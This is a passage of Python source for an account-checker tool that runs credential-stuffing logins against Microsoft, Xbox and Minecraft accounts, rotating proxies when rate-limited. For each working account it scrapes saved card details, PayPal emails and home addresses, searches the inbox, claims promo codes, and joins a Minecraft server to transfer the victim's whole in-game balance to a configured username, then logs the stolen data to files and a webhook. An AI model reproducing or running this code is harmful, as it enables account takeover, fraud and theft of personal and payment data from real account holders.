            fields.append({'name': ' ᴏᴘᴛɪғɪɴᴇ ᴄᴀᴘᴇ', 'value': ' Yes' if self.cape and self.cape == 'Yes' else ' No', 'inline': True})
            if self.namechanged and self.namechanged == 'True':
                fields.append({'name': ' ɴᴀᴍᴇᴄʜᴀɴɢᴇᴀʙʟᴇ', 'value': ' Yes', 'inline': True})
            elif self.namechanged is not None:
                fields.append({'name': ' ɴᴀᴍᴇᴄʜᴀɴɢᴇᴀʙʟᴇ', 'value': ' No', 'inline': True})
            if self.banned and self.banned != 'False':
                fields.append({'name': ' ʜʏᴘɪxᴇʟ sᴛᴀᴛᴜs', 'value': f'🚫 {self.banned}', 'inline': True})
            elif self.banned == 'False':
                fields.append({'name': ' ʜʏᴘɪxᴇʟ sᴛᴀᴛᴜs', 'value': '✅ Not Banned', 'inline': True})
            else:
                fields.append({'name': ' ʜʏᴘɪxᴇʟ sᴛᴀᴛᴜs', 'value': '❓ Unknown', 'inline': True})
            if self.access:
                access_emoji = '✅' if self.access == 'True' else '❌'
                fields.append({'name': ' ᴇᴍᴀɪʟ ᴀᴄᴄᴇss', 'value': f'{access_emoji} {self.access}', 'inline': True})
            embed = {'title': f' {notification_type} ', 'color': embed_color, 'fields': fields, 'timestamp': datetime.utcnow().isoformat()}
            try:
                if config.get('embed_image_enabled', True):
                    uuid_val = getattr(self, 'uuid', None)
                    template = config.get('embed_image_template', 'https://hypixel.paniek.de/signature/{uuid}/general-tooltip')
                    if '{uuid}' in str(template):
                        if uuid_val and str(uuid_val).strip() and (str(uuid_val) != 'N/A'):
                            img_url = str(template).format(uuid=uuid_val)
                        else:
                            img_url = None
                    else:
                        img_url = str(template)
                    if img_url:
                        embed['image'] = {'url': img_url}
            except Exception:
                pass
            try:
                if config.get('embed_thumbnail', True):
                    thumb_url = config.get('embed_thumbnail_url', config.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png'))
                    embed['thumbnail'] = {'url': thumb_url}
            except Exception:
                pass
            try:
                if config.get('embed_footer', True):
                    footer_text = config.get('webhook_username', 'MeowMal Checker')
                    footer_icon = config.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png')
                    embed['footer'] = {'text': footer_text, 'icon_url': footer_icon}
            except Exception:
                pass
            payload = {'username': config.get('webhook_username', 'MeowMal Checker'), 'avatar_url': config.get('webhook_avatar_url', 'https://i.imgur.com/4M34hi2.png'), 'embeds': [embed]}
            response = requests.post(webhook_url, json=payload, timeout=15)
            if response.status_code == 204:
                pass
            elif response.status_code == 429:
                if UI_ENABLED and ui:
                    ui.log_error(f'⚠ Webhook rate limited - wait and retry')
            elif response.status_code == 400:
                if UI_ENABLED and ui:
                    ui.log_error(f'✗ Webhook bad request: {response.text[:200]}')
            elif response.status_code == 404:
                if UI_ENABLED and ui:
                    ui.log_error(f'✗ Webhook URL not found - check config.ini')
            elif UI_ENABLED and ui:
                ui.log_error(f'✗ Webhook failed: {response.status_code} - {response.text[:100]}')
        except requests.exceptions.ConnectionError:
            if UI_ENABLED and ui:
                ui.log_error('[Webhook] Connection error - check internet')
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f'[Webhook] Error: {type(e).__name__}: {str(e)[:100]}')

    def check_donut_smp(self):
        if not self.name or self.name == 'N/A':
            return
        try:
            donut_api_url = 'https://api.donutsmp.net/v1/stats/'
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept': 'application/json'}
            r = self.session.get(f'{donut_api_url}{self.name}', headers=headers, timeout=12)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, dict) and 'result' in data:
                    stats_data = data['result']
                    lines = [f'{self.email}:{self.password}', f'Username: {self.name}']
                    for k, v in stats_data.items():
                        lines.append(f'{k}: {v}')
                    target_fn = self.fname if hasattr(self, 'fname') else fname
                    donut_content = '\n'.join(lines) + '\n' + '='*40 + '\n'
                    write_dedupe(target_fn, 'donut_stats.txt', donut_content)
                    if UI_ENABLED and ui:
                        ui.log_info(f'Donut SMP stats saved for {self.name}')
        except Exception:
            pass

    def autopay_donutsmp(self):
        global autopay_count
        if not MINECRAFT_AVAILABLE:
            return
        pay_target = config.get('donutsmp_pay_username', '') or config.get('pay_target', '')
        if not pay_target or pay_target in ('YOUR_USERNAME', ''):
            return
        try:
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            server_host = config.get('donutsmp_server_host', 'play.donutsmp.net')
            connection = Connection(server_host, 25565, auth_token=auth_token, initial_version=47, allowed_versions={47})

            @connection.listener(clientbound_play.JoinGamePacket)
            def on_join(packet):
                def delayed_pay():
                    time.sleep(2.0)
                    if UI_ENABLED and ui:
                        ui.log_info(f'Donut SMP AutoPay: Sending /pay {pay_target} * from {self.name}')
                    chat = ChatPacket(message=f'/pay {pay_target} *')
                    connection.write_packet(chat)
                    with stats_lock:
                        global autopay_count
                        autopay_count += 1
                    target_fn = self.fname if hasattr(self, 'fname') else fname
                    pay_line = f'{self.email}:{self.password} | Sent /pay {pay_target} * (Name: {self.name})\n'
                    write_dedupe(target_fn, 'donutsmp_autopay.txt', pay_line)
                    if UI_ENABLED and ui:
                        ui.add_log(f'DonutSMP AutoPay SUCCESS: {self.name} -> {pay_target}', 'SUCCESS')
                    time.sleep(1.0)
                    connection.disconnect()
                threading.Thread(target=delayed_pay, daemon=True).start()

            connection.connect()
            time.sleep(1.5)
            if getattr(connection, 'networking_thread', None):
                connection.disconnect()
        except Exception:
            pass


_sftag_lock = threading.Lock()
def get_urlPost_sFTTag(session):
    global retries
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'}
        timeout_val = int(config.get('timeout', 10))
        text = session.get(sFTTag_url, headers=headers, timeout=timeout_val).text
        match = RE_SFTTAG_VALUE.search(text)
        if match:
            sFTTag = next((g for g in match.groups() if g is not None), None)
            if sFTTag:
                match_url = RE_URLPOST_VALUE.search(text)
                if match_url:
                    urlPost = next((g for g in match_url.groups() if g is not None), None)
                    if urlPost:
                        urlPost = urlPost.replace('&amp;', '&')
                        return (urlPost, sFTTag, session)
    except Exception:
        pass
    retries += 1
    return ("ERROR", None, session)

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, fname
    try:
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'close'}
        login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=int(config.get('timeout', 10)))
        if '#' in login_request.url and login_request.url != sFTTag_url:
            token = urllib.parse.parse_qs(urllib.parse.urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
            if token != 'None':
                return (token, session)
        elif 'cancel?mkt=' in login_request.text:
            ipt = RE_IPT.search(login_request.text).group()
            pprid = RE_PPRID.search(login_request.text).group()
            uaid = RE_UAID.search(login_request.text).group()
            data = {'ipt': ipt, 'pprid': pprid, 'uaid': uaid}
            
            action_url = RE_ACTION_FMHF.search(login_request.text).group()
            ret = session.post(action_url, data=data, allow_redirects=True, timeout=int(config.get('timeout', 10)))
            
            return_url = RE_RETURN_URL.search(ret.text).group()
            fin = session.get(return_url, allow_redirects=True, timeout=int(config.get('timeout', 10)))
            token = urllib.parse.parse_qs(urllib.parse.urlparse(fin.url).fragment).get('access_token', ['None'])[0]
            if token != 'None':
                return (token, session)
        elif any((value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt='])):
            write_dedupe(fname, '2fa.txt', f'{email}:{password}\n')
            return ('2FA', session)
        elif any((value in login_request.text.lower() for value in ['password is incorrect', "account doesn't exist", "that microsoft account doesn't exist", "we couldn't find an account", "incorrect username or password", "the email address or password is incorrect", "sign-in name or password does not match"])):
            return ('None', session)
    except Exception:
        pass
    retries += 1
    return ('ERROR', session)

def payment(session, email, password):
    global retries, payment_methods, hits, config
    attempts = 0
    while attempts < maxretries:
        attempts += 1
        try:
            headers = {'Host': 'login.live.com', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Referer': 'https://account.microsoft.com/'}
            r = session.get('https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none', headers=headers, timeout=int(config.get('timeout', 10)))
            token = parse_qs(urlparse(r.url).fragment).get('access_token', ['None'])[0]
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36', 'Pragma': 'no-cache', 'Accept': 'application/json', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9', 'Authorization': f'MSADELEGATE1.0={token}', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Host': 'paymentinstruments.mp.microsoft.com', 'ms-cV': 'FbMB+cD6byLL1mn4W/NuGH.2', 'Origin': 'https://account.microsoft.com', 'Referer': 'https://account.microsoft.com/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'Sec-GPC': '1'}
            r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers, timeout=int(config.get('timeout', 10)))
            def lr_parse(source, start_delim, end_delim, create_empty=True):
                pattern = re.escape(start_delim) + '(.*?)' + re.escape(end_delim)
                match = re.search(pattern, source)
                if match:
                    return match.group(1)
                return '' if create_empty else None
            date_registered = lr_parse(r.text, '"creationDateTime":"', 'T', create_empty=False)
            fullname = lr_parse(r.text, '"accountHolderName":"', '"', create_empty=False)
            address1 = lr_parse(r.text, '"address":{"address_line1":"', '"')
            card_holder = lr_parse(r.text, 'accountHolderName":"', '","')
            credit_card = lr_parse(r.text, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
            expiry_month = lr_parse(r.text, 'expiryMonth":"', '",')
            expiry_year = lr_parse(r.text, 'expiryYear":"', '",')
            last4 = lr_parse(r.text, 'lastFourDigits":"', '",')
            pp = lr_parse(r.text, '":{"paymentMethodType":"paypal","', '}},{"id')
            paypal_email = lr_parse(r.text, 'email":"', '"', create_empty=False)
            balance = lr_parse(r.text, 'balance":', ',"', create_empty=False)
            json_data = json.loads(r.text)
            city = region = zipcode = card_type = cod = ''
            if isinstance(json_data, list):
                for item in json_data:
                    if 'city' in item:
                        city = item['city']
                    if 'region' in item:
                        region = item['region']
                    if 'postal_code' in item:
                        zipcode = item['postal_code']
                    if 'cardType' in item:
                        card_type = item['cardType']
                    if 'country' in item:
                        cod = item['country']
            else:
                city = json_data.get('city', '')
                region = json_data.get('region', '')
                zipcode = json_data.get('postal_code', '')
                card_type = json_data.get('cardType', '')
                cod = json_data.get('country', '')
            user_address = f'[Address: {address1} City: {city} State: {region} Postalcode: {zipcode} Country: {cod}]'
            cc_info = f'[CardHolder: {card_holder} | CC: {credit_card} | CC expiryMonth: {expiry_month} | CC ExpYear: {expiry_year} | CC Last4Digit: {last4} | CC Funding: {card_type}]'
            r = session.get(f'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions', headers=headers)
            ctpid = lr_parse(r.text, '"subscriptionId":"ctp:', '"')
            item1 = lr_parse(r.text, '"title":"', '"')
            auto_renew = lr_parse(r.text, f'"subscriptionId":"ctp:{ctpid}","autoRenew":', ',')
            start_date = lr_parse(r.text, '"startDate":"', 'T')
            next_renewal_date = lr_parse(r.text, '"nextRenewalDate":"', 'T')
            parts = []
            if item1 is not None:
                parts.append(f'Purchased Item: {item1}')
            if auto_renew is not None:
                parts.append(f'Auto Renew: {auto_renew}')
            if start_date is not None:
                parts.append(f'startDate: {start_date}')
            if next_renewal_date is not None:
                parts.append(f'Next Billing: {next_renewal_date}')
            if parts:
                subscription1 = f"[ {' | '.join(parts)} ]"
            else:
                subscription1 = None
            mdrid = lr_parse(r.text, '"subscriptionId":"mdr:', '"')
            auto_renew2 = lr_parse(r.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":', ',')
            start_date2 = lr_parse(r.text, '"startDate":"', 'T')
            recurring = lr_parse(r.text, 'recurringFrequency":"', '"')
            next_renewal_date2 = lr_parse(r.text, '"nextRenewalDate":"', 'T')
            item_bought = lr_parse(r.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":{auto_renew2},"startDate":"{start_date2}","recurringFrequency":"{recurring}","nextRenewalDate":"{next_renewal_date2}","title":"', '"')
            parts2 = []
            if item_bought is not None:
                parts2.append(f"Purchased Item's: {item_bought}")
            if auto_renew2 is not None:
                parts2.append(f'Auto Renew: {auto_renew2}')
            if start_date2 is not None:
                parts2.append(f'startDate: {start_date2}')
            if recurring is not None:
                parts2.append(f'Recurring: {recurring}')
            if next_renewal_date2 is not None:
                parts2.append(f'Next Billing: {next_renewal_date2}')
            if parts:
                subscription2 = f"[{' | '.join(parts2)}]"
            else:
                subscription2 = None
            description = lr_parse(r.text, '"description":"', '"')
            product_typee = lr_parse(r.text, '"productType":"', '"')
            product_type_map = {'PASS': 'XBOX GAME PASS', 'GOLD': 'XBOX GOLD'}
            product_type = product_type_map.get(product_typee, product_typee)
            quantity = lr_parse(r.text, 'quantity":', ',')
            currency = lr_parse(r.text, 'currency":"', '"')
            total_amount_value = lr_parse(r.text, 'totalAmount":', '', create_empty=False)
            if total_amount_value is not None:
                total_amount = total_amount_value + f' {currency}'
            else:
                total_amount = f'0 {currency}'
            parts3 = []
            if description is not None:
                parts3.append(f'Product: {description}')
            if product_type is not None:
                parts3.append(f'Product Type: {product_type}')
            if quantity is not None:
                parts3.append(f'Total Purchase: {quantity}')
            if total_amount is not None:
                parts3.append(f'Total Price: {total_amount}')
            if parts:
                subscription3 = f"[ {' | '.join(parts3)} ]"
            else:
                subscription3 = None
            payment = ''
            paymentprint = ''
            has_payment_method = False
            if date_registered:
                payment += f'\nDate Registered: {date_registered}'
                paymentprint += f' | Date Registered: {date_registered}'
            if fullname:
                payment += f'\nFullname: {fullname}'
                paymentprint += f' | Fullname: {fullname}'
            if user_address:
                payment += f'\nUser Address: {user_address}'
                paymentprint += f' | User Address: {user_address}'
            if paypal_email:
                payment += f'\nPaypal Email: {paypal_email}'
                paymentprint += f' | Paypal Email: {paypal_email}'
                has_payment_method = True
            if cc_info and credit_card:
                payment += f'\nCC Info: {cc_info}'
                paymentprint += f' | CC Info: {cc_info}'
                has_payment_method = True
            if balance:
                payment += f'\nBalance: {balance}'
                paymentprint += f' | Balance: {balance}'
            if subscription1:
                payment += f'\n{subscription1}'
                paymentprint += f' | {subscription1}'
            if subscription2:
                payment += f'\n{subscription2}'
                paymentprint += f' | {subscription2}'
            if subscription3:
                payment += f'\n{subscription3}'
                paymentprint += f' | {subscription3}'
            if has_payment_method or balance or subscription1 or subscription2 or subscription3:
                if credit_card and last4:
                    card_capture = f'{email}:{password} | Card: {credit_card} | Last4: {last4} | Exp: {expiry_month}/{expiry_year} | Type: {card_type} | Holder: {card_holder}'
                    write_dedupe(fname, 'payment.txt', card_capture + '\n')
                    if UI_ENABLED and ui:
                        ui.log_info(f'Card captured: {credit_card} ending {last4}')
                if paypal_email:
                    paypal_capture = f"{email}:{password} | PayPal: {paypal_email} | Holder: {fullname or 'N/A'}"
                    write_dedupe(fname, 'payment.txt', paypal_capture + '\n')
                    if UI_ENABLED and ui:
                        ui.log_info(f'PayPal captured: {paypal_email}')
                payment += '\n============================\n'
                payment_methods += 1
                if UI_ENABLED and ui:
                    ui.log_payment(email, 'Payment methods found')
            break
        except Exception as e:
            retries += 1
            session.proxies = getproxy()
            time.sleep(0.1)


_enrichment_pool = None  

def enrich_valid_account(session, email, password, xbl_token, target_fname):

    try:
        checker = MicrosoftChecker(session, email, password, config, target_fname)

        try:
            checker.check_country()
        except Exception:
            pass

        if config.get('scan_inbox', True):
            try:
                keywords_str = config.get('inbox_keywords', '')
                if keywords_str and isinstance(keywords_str, str) and keywords_str.strip():
                    keywords = [k.strip() for k in keywords_str.split(',') if k.strip()]
                else:
                    keywords = ["steam", "netflix", "Crunchyroll", "discord", "microsoft", "nordvpn", "paypal", "roblox", "epic games", "spotify", "playstation", "xbox"]
                inbox_results = checker.check_inbox(keywords)
                if inbox_results:
                    for keyword, match_count in inbox_results:
                        if match_count and int(match_count) > 0:
                            clean_kw = "".join([c for c in str(keyword) if c.isalnum() or c in (' ', '_', '-')]).strip()
                            safe_keyword = clean_kw.title().replace(' ', '_') if clean_kw else "Search_Hit"
                            write_dedupe(target_fname, f'Inboxes/{safe_keyword}.txt', f'{email}:{password}\n')
                    formatted_results = ', '.join([f'{k} ({v})' for k, v in inbox_results])
                    write_dedupe(target_fname, 'Inbox.txt', f'{email}:{password} | Inbox - {formatted_results}\n')
            except Exception:
                pass

        if xbl_token:
            try:
                fetch_discord_promos(session, email, password, xbl_token, target_fname)
            except Exception:
                pass

        if config.get('payment', False) or config.get('check_payment', False):
            try:
                checker.check_payment_instruments()
            except Exception:
                pass

        if config.get('check_microsoft_balance', False):
            try:
                bal = checker.check_balance()
                if bal and bal != '0.00 USD':
                    write_dedupe(target_fname, 'balance.txt', f'{email}:{password} | Balance: {bal}\n')
            except Exception:
                pass

        if config.get('check_rewards_points', True) or config.get('check_reward_points', True):
            try:
                pts = checker.check_rewards_points()
                if pts and str(pts) != '0':
                    write_dedupe(target_fname, 'point.txt', f'{email}:{password} | Points: {pts}\n')
            except Exception:
                pass
    except Exception:
        pass

def validmail(email, password):
    global vm
    with stats_lock:
        vm += 1
    try:
        write_dedupe(fname, 'valid_mail.txt', f'{email}:{password}\n')
    except Exception:
        pass
    if UI_ENABLED and ui:
        ui.add_log(f'{Fore.LIGHTCYAN_EX}[VALID_MAIL]{Style.RESET_ALL} {email}:{password}', 'VALID_MAIL')

def claim_buddypass_offers(session, xbox_token, fname):
    global retries
    codes = []
    try:
        xsts = None
        for _ in range(maxretries):
            try:
                xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]}, 'RelyingParty': 'http://mp.microsoft.com/', 'TokenType': 'JWT'}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=int(config.get('timeout', 10)))
                break
            except Exception:
                retries += 1
                session.proxies = getproxy()
                if len(proxylist) == 0:
                    return  # skip buddypass if rate limited
                continue
        else:
            return

        js = xsts.json()
        if 'DisplayClaims' not in js or 'xui' not in js['DisplayClaims']: return
        uhss = js['DisplayClaims']['xui'][0]['uhs']
        xsts_token = js.get('Token')
        headers = {'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8', 'Authorization': f'XBL3.0 x={uhss};{xsts_token}', 'Ms-Cv': 'OgMi8P4bcc7vra2wAjJZ/O.19', 'Origin': 'https://www.xbox.com', 'Priority': 'u=1, i', 'Referer': 'https://www.xbox.com/', 'Sec-Ch-Ua': '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0', 'X-Ms-Api-Version': '1.0'}
        
        r = None
        for _ in range(maxretries):
            try:
                r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers, timeout=int(config.get('timeout', 10)))
                break
            except Exception:
                retries += 1
                session.proxies = getproxy()
                if len(proxylist) == 0:
                    return  # skip buddypass if rate limited
                continue
        else:
            return

        if 'offerid' in r.text.lower():
            offers = r.json()['offers']
            current_time = datetime.now(timezone.utc)
            for offer in offers:
                codes.append(offer['offerId'])
            
            if len(offers) < 5:
                for _ in range(3):
                    try:
                        r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers, timeout=int(config.get('timeout', 10)))
                        if 'offerId' in r.text:
                            offers = r.json()['offers']
                            current_time = datetime.now(timezone.utc)
                            valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
                            
                            for offer in valid_offer_ids:
                                write_dedupe(fname, 'Codes.txt', f'{offer}\n')
                                
                            shouldContinue = False
                            for offer in offers:
                                if offer['offerId'] not in codes:
                                    shouldContinue = True
                            for offer in offers:
                                codes.append(offer['offerId'])
                            if not shouldContinue:
                                break
                        else:
                            break
                    except Exception:
                        retries += 1
                        session.proxies = getproxy()
                        continue
        else:
             for _ in range(3):
                try:
                    r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers, timeout=int(config.get('timeout', 10)))
                    if 'offerId' in r.text:
                        offers = r.json()['offers']
                        current_time = datetime.now(timezone.utc)
                        valid_offer_ids = [offer['offerId'] for offer in offers if not offer['claimed'] and offer['offerId'] not in codes and (datetime.fromisoformat(offer['expiration'].replace('Z', '+00:00')) > current_time)]
                        for offer in valid_offer_ids:
                            write_dedupe(fname, 'Codes.txt', f'{offer}\n')
                        shouldContinue = False
                        for offer in offers:
                            if offer['offerId'] not in codes:
                                shouldContinue = True
                        for offer in offers:
                            codes.append(offer['offerId'])
                        if not shouldContinue:
                            break
                    else:
                        break
                except Exception:
                    retries += 1
                    session.proxies = getproxy()
                    continue
    except Exception:
        pass

def fetch_discord_promos(session, email, password, xbox_token, fname):
    if not xbox_token:
        return
    try:
        xsts_gp = None
        for attempt in range(maxretries):
            try:
                r = session.post(
                    'https://xsts.auth.xboxlive.com/xsts/authorize',
                    json={
                        'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbox_token]},
                        'RelyingParty': 'http://xboxlive.com',
                        'TokenType': 'JWT'
                    },
                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                    timeout=10
                )
                if r.status_code == 429:
                    time.sleep(1)
                    continue
                if r.status_code == 200:
                    js = r.json()
                    xsts_token = js.get('Token')
                    uhs = js.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs', '')
                    if xsts_token and uhs:
                        xsts_gp = f'XBL3.0 x={uhs};{xsts_token}'
                        break
                else:
                    break
            except Exception:
                time.sleep(0.3)
                continue

        if not xsts_gp:
            return

        offers_r = None
        for attempt in range(maxretries):
            try:
                offers_r = session.get(
                    'https://profile.gamepass.com/v2/offers',
                    headers={'authorization': xsts_gp},
                    timeout=10
                )
                if offers_r.status_code == 429:
                    time.sleep(1)
                    continue
                break
            except Exception:
                time.sleep(0.3)
                continue

        if offers_r is None or offers_r.status_code != 200:
            return

        for offer in offers_r.json().get('offers', []):
            promo = None
            status = offer.get('offerStatus')
            offer_name = offer.get('offerName', offer.get('name', 'Promo'))
            if status == 'available':
                try:
                    pr = session.post(
                        f"https://profile.gamepass.com/v2/offers/{offer.get('offerId')}",
                        headers={'authorization': xsts_gp},
                        timeout=10
                    )
                    if pr.status_code == 200:
                        promo = pr.json().get('resource')
                except Exception:
                    pass
            elif status == 'claimed':
                promo = offer.get('resource')

            if promo:
                promo_line = f'{email}:{password} | {promo}\n'
                write_dedupe(fname, 'Promo.txt', promo_line)
                if 'discord' in str(promo).lower() or 'discord' in str(offer_name).lower():
                    write_dedupe(fname, 'Discord_Promos.txt', promo_line)
                if UI_ENABLED and ui:
                    ui.add_log(f'Promo: {email} | {promo}', 'SUCCESS')
    except Exception:
        pass

def checkownership(entitlements_response):
    if not entitlements_response or not isinstance(entitlements_response, dict):
        return None
    items = entitlements_response.get('items', [])
    if not items:
        return None
    has_normal_minecraft = False
    has_game_pass_pc = False
    has_game_pass_ultimate = False
    for item in items:
        name = item.get('name', '')
        source = item.get('source', '')
        name_lower = str(name).lower()
        source_upper = str(source).upper()

        if name in ('game_minecraft', 'product_minecraft') and source in ('PURCHASE', 'MC_PURCHASE'):
            has_normal_minecraft = True

        elif 'minecraft' in name_lower and name_lower not in ('minecraft_realms',):
            has_normal_minecraft = True

        if name == 'product_game_pass_ultimate' or 'game_pass_ultimate' in name_lower or 'xgpu' in name_lower:
            has_game_pass_ultimate = True
        elif name == 'product_game_pass_pc' or ('game_pass' in name_lower and 'ultimate' not in name_lower) or 'xgp' in name_lower:
            has_game_pass_pc = True

    if has_normal_minecraft and has_game_pass_ultimate:
        return 'Normal Minecraft (with Game Pass Ultimate)'
    if has_normal_minecraft and has_game_pass_pc:
        return 'Normal Minecraft (with Game Pass)'
    if has_normal_minecraft:
        return 'Normal Minecraft'
    if has_game_pass_ultimate:
        return 'Xbox Game Pass Ultimate'
    if has_game_pass_pc:
        return 'Xbox Game Pass (PC)'
    return None

def checkmc(session, email, password, token, xbox_token):
    global retries, cpm, checked, xgp, xgpu, other, config
    acctype = None
    attempts = 0
    max_time = time.time() + 30
    checkrq = None
    _no_proxy = is_no_proxy()


    while attempts < maxretries and time.time() < max_time:
        attempts += 1
        try:
            checkrq = session.get('https://api.minecraftservices.com/entitlements/license',
                                  headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=10)
            if checkrq.status_code == 429:
                with stats_lock:
                    retries += 1
                if not _no_proxy:
                    session.proxies = getproxy()
                time.sleep(0.5 if _no_proxy else 0.3)
                continue
            else:
                break
        except Exception:
            with stats_lock:
                retries += 1
            if not _no_proxy:
                session.proxies = getproxy()
            continue

    if time.time() >= max_time:
        return False

    if checkrq is not None and checkrq.status_code == 200:
        try:
            acctype = checkownership(checkrq.json())
        except Exception:
            pass

        if acctype is None:
            try:
                profilerq = session.get('https://api.minecraftservices.com/minecraft/profile',
                                        headers={'Authorization': f'Bearer {token}'}, timeout=10)
                if profilerq.status_code == 200:
                    acctype = 'Normal Minecraft'
            except Exception:
                pass


    if not acctype:
        try:
            storerq = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                  headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=10)
            if storerq.status_code == 200:
                acctype = checkownership(storerq.json())
        except Exception:
            pass


    if not acctype:
        try:
            profilerq = session.get('https://api.minecraftservices.com/minecraft/profile',
                                    headers={'Authorization': f'Bearer {token}'}, timeout=10)
            if profilerq.status_code == 200:
                acctype = 'Normal Minecraft'
        except Exception:
            pass

    if not acctype:
        return False


    name, uuid_str, capes_list = 'N/A', 'N/A', []
    try:
        profilerq = session.get('https://api.minecraftservices.com/minecraft/profile',
                                headers={'Authorization': f'Bearer {token}'}, timeout=10)
        if profilerq.status_code == 200:
            p_data = profilerq.json()
            name = p_data.get('name', 'N/A') or 'N/A'
            uuid_str = p_data.get('id', 'N/A') or 'N/A'
            capes_data = p_data.get('capes', [])
            for c in capes_data:
                if isinstance(c, dict) and c.get('alias'):
                    capes_list.append(c['alias'])
    except Exception:
        pass

    capes_str = ', '.join(capes_list)

    try:
        capture = Capture(email, password, name, capes_str, uuid_str, token, acctype, session)
        capture.handle(session)
    except Exception as e:
        if UI_ENABLED and ui:
            ui.log_error(f'Capture error: {e}')
        try:
            write_dedupe(fname, 'Hits.txt', f'{email}:{password}\n')
            with stats_lock:
                global hits
                hits += 1
        except Exception:
            pass

    if acctype in ('Xbox Game Pass Ultimate', 'Normal Minecraft (with Game Pass Ultimate)'):
        with stats_lock:
            xgpu += 1
        write_dedupe(fname, 'xbox game pass unlimited.txt', f'{email}:{password}\n')
        if 'Normal' in acctype:
            write_dedupe(fname, 'normal.txt', f'{email}:{password}\n')
        try: claim_buddypass_offers(session, xbox_token, fname)
        except Exception: pass
        try: fetch_discord_promos(session, email, password, xbox_token, fname)
        except Exception: pass
        return True
    elif acctype in ('Xbox Game Pass (PC)', 'Normal Minecraft (with Game Pass)'):
        with stats_lock:
            xgp += 1
        write_dedupe(fname, 'xbox game pass.txt', f'{email}:{password}\n')
        if 'Normal' in acctype:
            write_dedupe(fname, 'normal.txt', f'{email}:{password}\n')
        try: claim_buddypass_offers(session, xbox_token, fname)
        except Exception: pass
        try: fetch_discord_promos(session, email, password, xbox_token, fname)
        except Exception: pass
        return True
    elif acctype == 'Normal Minecraft':
        write_dedupe(fname, 'normal.txt', f'{email}:{password}\n')
        try: claim_buddypass_offers(session, xbox_token, fname)
        except Exception: pass
